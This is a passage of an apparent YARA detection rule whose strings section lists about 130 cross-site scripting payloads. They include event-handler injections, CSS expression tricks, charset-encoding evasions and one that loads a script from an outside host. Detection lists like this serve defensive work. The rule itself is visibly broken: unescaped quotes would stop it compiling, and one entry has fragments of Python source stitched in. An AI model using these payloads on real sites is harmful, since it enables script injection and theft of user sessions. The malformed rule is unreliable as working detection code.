        $payload20 = "<img src\x00=x onerror="javascript:alert(1)">"
        $payload21 = "<img src\x47=x onerror="javascript:alert(1)">"
        $payload22 = "<img src=x\x09onerror="javascript:alert(1)">"
        $payload23 = "<img src=x\x10onerror="javascript:alert(1)">"
        $payload24 = "<img src=x\x11onerror="javascript:alert(1)">"
        $payload25 = "<img src=x\x12onerror="javascript:alert(1)">"
        $payload26 = "<img src=x\x13onerror="javascript:alert(1)">"
        $payload27 = "<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">"
        $payload28 = "<img src=x onerror=\x09"javascript:alert(1)">"
        $payload29 = "<img src=x onerror=\x10"javascript:alert(1)">"
        $payload30 = "<img src=x onerror=\x11"javascript:alert(1)">"
        $payload31 = "<img src=x onerror=\x12"javascript:alert(1)">"
        $payload32 = "<img src=x onerror=\x32"javascript:alert(1)">"
        $payload33 = "<img src=x onerror=\x00"javascript:alert(1)">"
        $payload34 = "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>"
        $payload35 = "<img src="x` `<script>javascript:alert(1)</script>"` `>"
        $payload36 = "<img src onerror /" '"= alt=javascript:alert(1)//">"
        $payload37 = "<title onpropertychange=javascript:alert(1)></title><title title=>"
        $payload38 = "<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">"
        $payload39 = "<!--[if]><script>javascript:alert(1)</script -->"
        $payload40 = "<!--[if<img src=x onerror=javascript:alert(1)//]> -->"
        $payload41 = "<script src="/\%(jscript)s"></script>"
        $payload42 = "<script src="\\%(jscript)s"></script>"
        $payload43 = "<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>"
        $payload44 = "<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X"
        $payload45 = "<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>"
        $payload46 = "<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d"
        $payload47 = "<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>"
        $payload48 = "<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>"
        $payload49 = "<style>*[{}@import'%(css)s?]</style>X"
        $payload50 = "<div style="font-family:'foo&#10;;color:red;';">XXX"
        $payload51 = "<div style="font-family:foo}color=red;">XXX"
        $payload52 = "<// style=x:expression\28javascript:alert(1)\29>"
        $payload53 = "<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>"
        $payload54 = "<div style=content:url(%(svg)s)></div>"
        $payload55 = "<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X"
        $payload56 = "<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>"
        $payload57 = "<x style="background:url('x&#1;;color:red;/*')">XXX</x>"
        $payload58 = "<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>"
        $payload59 = "<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>"
        $payload60 = "<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>"
        $payload61 = "<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>"
        $payload62 = "<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi"
        $payload63 = "<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>"
        $payload64 = "<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾"
        $payload65 = "X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >"
        $payload66 = "1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>"
        $payload67 = "1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>"
        $payload68 = "<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>"
        $payload69 = "1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>"
        $payload70 = "<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>"
        $payload71 = "<x style="behavior:url(%(sct)s)">"
        $payload72 = "<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>"
        $payload73 = "<event-source src="%(event)s" onload="javascript:alert(1)">"
        $payload74 = "<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">"
        $payload75 = "<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">"
        $payload76 = "<script>%(payload)s</script>"
        $payload77 = "<script src=%(jscript)s></script>"
        $payload78 = "<script language='javascript' src='%(jscript)s'></script>"
        $payload79 = "<script>javascript:alert(1)</script>"
        $payload80 = "<IMG SRC="javascript:javascript:alert(1);">"
        $payload81 = "<IMG SRC=javascript:javascript:alert(1)>"
        $payload82 = "<IMG SRC=`javascript:javascript:alert(1)`>"
        $payload83 = "<SCRIPT SRC=%(jscript)s?<B>"
        $payload84 = "<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>"
        $payload85 = "<BODY ONLOAD=javascript:alert(1)>"
        $payload86 = "<BODY ONLOAD=javascript:javascript:alert(1)>"
        $payload87 = "<IMG SRC="jav    ascript:javascript:alert(1);">"
        $payload88 = "<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>"
        $payload89 = "<SCRIPT/SRC="%(jscript)s"></SCRIPT>"
        $payload90 = "<<SCRIPT>%(payload)s//<</SCRIPT>"
        $payload91 = "<IMG SRC="javascript:javascript:alert(1)""
        $payload92 = "<iframe src=%(scriptlet)s <"
        $payload93 = "<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">"
        $payload94 = "<IMG DYNSRC="javascript:javascript:alert(1)">"
        $payload95 = "<IMG LOWSRC="javascript:javascript:alert(1)">"
        $payload96 = "<BGSOUND SRC="javascript:javascript:alert(1);">"
        $payload97 = "<BR SIZE="&{javascript:alert(1)}">"
        $payload98 = "<LAYER SRC="%(scriptlet)s"></LAYER>"
        $payload99 = "<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">"
        $payload100 = "<STYLE>@import'%(css)s';</STYLE>"
        $payload101 = "<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">"
        $payload102 = "<XSS STYLE="behavior: url(%(htc)s);">"
        $payload103 = "<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS"
        $payload104 = "<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">"
        $payload105 = "<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">"
        $payload106 = "<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>"
        $payload107 = "<TABLE BACKGROUND="javascript:javascript:alert(1)">"
        $payload108 = "<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">"
        $payload109 = "<DIV STYLE="background-image: url(javascript:javascript:alert(1))">"
        $payload110 = "<DIV STYLE="width:expression(javascript:alert(1));">"
        $payload111 = "<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">"
        $payload112 = "<XSS STYLE="xss:expression(javascript:alert(1))">"
        $payload113 = "<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>"
        $payload114 = "<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>"
        $payload115 = "<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>"
        $payload116 = "<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->"
        $payload117 = "<BASE HREF="javascript:javascript:alert(1);//">"
        $payload118 = "<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>"
        $payload119 = "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>"
        $payload120 = "<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>"
        $payload121 = "<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>"
        $payload122 = "<SCRIPT SRC="%(jpg)s"></SCRIPT>"
        $payload123 = "<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-"
        $payload124 = "<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X"
        $payload125 = "<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>"
        $payload126 = "<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">"
        $payload127 = "<STYLE>@import'%(css)s';</STYLE>"
        $payload128 = "<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');</STYLE>"
        $payload129 = "<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>"
        $payload130 = "<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>"
        $payload131 = "<style onreadystatechange=javascript:javascript:alert(1);></style>"
        $payload132 = "<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>"
        $payload133 = "<embed code=%(scriptlet)s></embed>"
        $payload134 = "<embed code=javascript:javascript:alert(1);></embed>"
        $payload135 = "<embed src=%(jscript)s></embed>"
        $payload136 = "<frameset onload=javascript:javascript:alert(1)></frameset>"
        $payload137 = "<object onerror=javascript:javascript:alert(1)>"
        $payload138 = "<embed type="image" src=%(scriptlet)s></embed>"
        $payload139 = "<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>"
        $payload140 = "<IMG SRC=&{javascript:alert(1);};>"
        $payload141 = "<a href="jav&#65ascript:javascript:alert(1)">test1</a>"
        $payload142 = "<a href="jav&#97ascript:javascript:alert(1)">test1</a>"
        $payload143 = "<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>"
        $payload144 = "<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">"
        $payload145 = "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";"
        $payload146 = "alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--"
        $payload147 = "></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
        $payload148 = "'';!--"<XSS>=&{()}"
        $payload149 = "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"
        $payload150 = "<IMG SRC="javascript:alert('XSS');">"
        $payload151 = "<IMG SRC=javascript:alert('XSS')>"
            
         condition:
            any of ($prompt*, $onclick*, $eval*, $onerror*, $script*, $onevent* , $payload*)
